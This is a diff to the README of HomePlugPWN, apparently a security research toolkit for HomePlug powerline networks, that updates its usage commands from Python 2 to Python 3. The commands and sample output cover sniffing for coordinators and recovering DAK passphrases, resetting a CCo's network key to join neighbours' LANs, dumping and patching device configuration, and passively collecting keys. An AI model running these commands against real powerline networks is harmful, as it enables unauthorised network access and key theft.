@@ -5,8 +5,8 @@ HomePlugPWN
 - Tools on HomePlug GreenPHY will be presented soonly...
 
 ## Requirements 
-- Python >= 2.6
-- Scapy 2.x
+- Python >= 3.x
+- Scapy v2.x
 - Promiscous mode for Sniff Indicate packets
 
 ## Tools
@@ -26,7 +26,7 @@ HomePlugPWN
 First we plug our device to the powerline and sniff for every possible CCo:
 
 ```bash
-python plcmon.py 
+python3 plcmon.py 
 [+] Enabling sniff mode
 Sent 1 packets.
 [+] Listening for CCo station...
@@ -39,14 +39,14 @@ The tool recovers also the DAK passphrase directly.
 Too change the NMK of the CCos to have a chance to connect to neighbor(s) LAN, we can send the SetEncryptionKeyRequest to the CCos:
 
 ```bash
-python quickKODAK.py -i eth0 -t 4494fc56ff34
+python3 quickKODAK.py -i eth0 -t 4494fc56ff34
 Sent 1 packets.
 ``` 
 
 If you want to reconfigure all device, skip 2-3 of the MAC address found previously as follows:
 
 ```bash
-python quickKODAK.py -i eth0 -t 4494fc56
+python3 quickKODAK.py -i eth0 -t 4494fc56
 Sent 1 packets.
 ```
 
@@ -59,7 +59,7 @@ The following tool aims to dump the entire PIB. You could also use the same tech
 To process the dump use it as follows:
 
 ```bash
-python2 ./PIBdump.py -i enp0s26u1u1 -o mycpl.pib
+python3 ./PIBdump.py -i enp0s26u1u1 -o mycpl.pib
 [...]
 [+] PIB dump: Success!
 ```
@@ -76,7 +76,7 @@ wc -c mycpl.pib
 If you want to change your MAC address for example, you can specify the Scapy attribute to modify and its new value:
 
 ```bash
-python2 patchPIB.py -i enp0s26u1u1 -d <dest. MAC addr> -t "PIBMACAddr" -v "c0:ff:ee:c0:ff:ee"
+python3 patchPIB.py -i enp0s26u1u1 -d <dest. MAC addr> -t "PIBMACAddr" -v "c0:ff:ee:c0:ff:ee"
 ```
 
 The MAC address should be changed after that for your targeted device. But if the addresses are read-only for this device, you have to hack a little bit to reflash it correctly.
@@ -84,7 +84,7 @@ The MAC address should be changed after that for your targeted device. But if th
 Nevertheless, if you want to change any arbitrary byte use this command as follows:
 
 ```bash
- python2 patchPIB.py -i enp0s26u1u1 -d <dest. MAC addr> -a <start_addr>:<len> -v <value>
+ python3 patchPIB.py -i enp0s26u1u1 -d <dest. MAC addr> -a <start_addr>:<len> -v <value>
 ```
 
 Like this, you can rewrite the tone map and any other field of your choice ;)
@@ -96,7 +96,7 @@ The standard is vulnerable to passive attack, letting an attacker to collect key
 The tool `HPGPKeysCollect.py` implements the passive attack to collect keys from a capture, or by sniffing the local PLC interface as follows:
 
 ```bash
-python HPGPKeysCollect.py -i eth0
+python3 HPGPKeysCollect.py -i eth0
 [...]
 Sniffing on interface 'eth0'
 [...]
